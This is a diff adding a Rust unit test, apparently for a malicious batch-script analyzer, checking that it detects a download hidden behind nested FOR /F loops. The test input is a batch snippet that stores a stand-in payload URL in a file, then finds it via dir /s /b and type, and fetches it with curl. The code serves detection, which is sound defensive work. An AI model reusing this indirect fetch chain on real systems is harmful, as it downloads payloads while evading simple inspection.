@@ -3870,6 +3870,28 @@ for /f "tokens=* delims=" %%F in ('dir /s /b C:\Work\*.txt') do for /f "tokens=*
     }
 
     #[test]
+    fn for_f_dir_s_b_path_wildcard_discovers_nested_generated_file_path() {
+        let report = analyze(
+            br#"echo https://for-f-dir-s-b-path-wildcard-nested.example/payload.exe>C:\Work\Sub\url.txt
+for /f "tokens=* delims=" %%F in ('dir /s /b C:\Work\*.txt') do for /f "tokens=* delims=" %%U in ('type %%F ^| find "https://"') do curl -o payload.exe %%U"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://for-f-dir-s-b-path-wildcard-nested.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "FOR /F dir /s /b path wildcard did not discover nested generated file path for later type: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn for_f_dir_combined_b_s_path_wildcard_emits_full_generated_file_path() {
         let report = analyze(
             br#"echo https://for-f-dir-combined-b-s.example/payload.exe>C:\Work\url.txt
